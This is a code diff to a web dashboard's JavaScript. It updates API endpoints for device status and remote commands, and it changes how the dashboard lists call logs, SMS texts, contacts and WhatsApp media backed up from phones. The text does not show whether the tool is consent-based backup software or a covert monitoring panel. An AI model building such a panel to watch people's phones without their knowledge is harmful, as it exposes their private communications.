@@ -178,11 +178,12 @@
     // Fetch device status
     async function fetchDeviceStatus(deviceKey) {
       try {
-        const response = await fetch(`${API_BASE}/device/${deviceKey}`);
+        const device = devices[deviceKey];
+        const response = await fetch(`${API_BASE}/devices/${device.deviceId}/status`);
         const data = await response.json();
         
-        if (data.ok) {
-          updateDeviceUI(deviceKey, data.device);
+        if (data.status) {
+          updateDeviceUI(deviceKey, data.status);
         } else {
           setDeviceOffline(deviceKey);
         }
@@ -230,7 +231,7 @@
       btn.disabled = true;
 
       try {
-        const response = await fetch(`${API_BASE}/device/${deviceKey}/command`, {
+        const response = await fetch(`${API_BASE}/devices/${device.deviceId}/commands`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ action })
@@ -238,7 +239,7 @@
 
         const result = await response.json();
         
-        if (result.ok) {
+        if (result.status === 'queued') {
           alert(`Command "${action}" sent to ${device.name}`);
         } else {
           alert(`Failed to send command: ${result.error}`);
@@ -263,29 +264,29 @@
 
         renderDataList('whatsapp-list', whatsapp.data || [], item => 
           `<div class="data-item">
-            <div>${item.content || item.messageType}</div>
-            <div class="timestamp">${new Date(item.timestamp).toLocaleString()} • ${item.senderName || item.direction}</div>
+            <div>${item.path || item.name || 'Media file'}</div>
+            <div class="timestamp">${new Date(item.backed_up_at || item.date).toLocaleString()} • ${item.deviceId || ''}</div>
           </div>`
         );
 
         renderDataList('calls-list', calls.data || [], item =>
           `<div class="data-item">
-            <div>${item.contactName || item.phoneNumber} • ${item.callType}</div>
-            <div class="timestamp">${new Date(item.timestamp).toLocaleString()} • ${item.duration}s</div>
+            <div>${item.name || item.number} • ${item.type === 1 ? 'Incoming' : item.type === 2 ? 'Outgoing' : item.type === 3 ? 'Missed' : 'Call'}</div>
+            <div class="timestamp">${new Date(item.date).toLocaleString()} • ${item.duration}s</div>
           </div>`
         );
 
         renderDataList('sms-list', sms.data || [], item =>
           `<div class="data-item">
             <div>${item.body?.substring(0, 50) || 'No content'}</div>
-            <div class="timestamp">${new Date(item.timestamp).toLocaleString()} • ${item.type}</div>
+            <div class="timestamp">${new Date(item.date).toLocaleString()} • ${item.type === 1 ? 'Inbox' : item.type === 2 ? 'Sent' : 'SMS'}</div>
           </div>`
         );
 
         renderDataList('contacts-list', contacts.data || [], item =>
           `<div class="data-item">
-            <div>${item.displayName}</div>
-            <div class="timestamp">${item.phoneNumber || 'No phone'}</div>
+            <div>${item.name}</div>
+            <div class="timestamp">${(item.phones || []).join(', ') || 'No phone'}</div>
           </div>`
         );
       } catch (error) {
